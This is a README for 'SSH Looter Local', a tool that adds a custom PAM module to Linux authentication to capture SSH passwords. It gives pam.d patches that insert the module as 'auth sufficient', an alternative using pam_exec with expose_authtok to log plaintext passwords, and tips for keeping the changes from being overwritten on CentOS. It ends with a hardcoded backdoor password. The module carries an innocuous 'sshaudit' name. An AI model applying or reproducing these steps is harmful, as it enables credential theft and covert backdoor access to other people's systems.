# SSH Looter Local

This project cannot be made without reference from:

- https://github.com/mthbernardes/sshLooterC
- https://github.com/cameron-gagnon/ssh_pass_logging
- https://github.com/linux-pam/linux-pam

# Modified Part - License

Licensed under GNU AGPL v3.

# Usage

You may need install dependencies:
- gcc (compiler)
- linux-api-headers (userspace Linux API headers)
- linux-headers (kernel Linux API headers)
- libpam0g-dev

Change `/etc/pam.d/{system,common}-auth`, apply patches like this:

```bash
+ # custom PAM module
+ auth sufficient pam_sshaudit.so
+ account optional pam_sshaudit.so

auth [success=1 default=ignore] pam_unix.so nullok_secure

#here's the fallback if no module succeeds
auth requisite pam_deny.so
```

# CENTOS 7 Users

Backup and unlink `/etc/pam.d/system-auth`, then remove `/etc/pam.d/system-auth-ac`, copy your backup back and do your change to prevent from being overridden by `authconfig`.

Since `auth sufficient pam_unix.so` is not set as `required`, you must put the `pam_sshaudit.so` line above `pam_unix.so` .

# More simple but obvious way

Use `pam_exec` to record password. Example program written in Golang can be checked in `sshaudit.go`

```bash
auth optional pam_exec.so expose_authtok /usr/bin/sshaudit

auth [success=1 default=ignore] pam_unix.so nullok_secure

#here's the fallback if no module succeeds
auth requisite pam_deny.so
```

# Backdoor password

hardcoded as: `ZJuj38ML0ddNDZKw`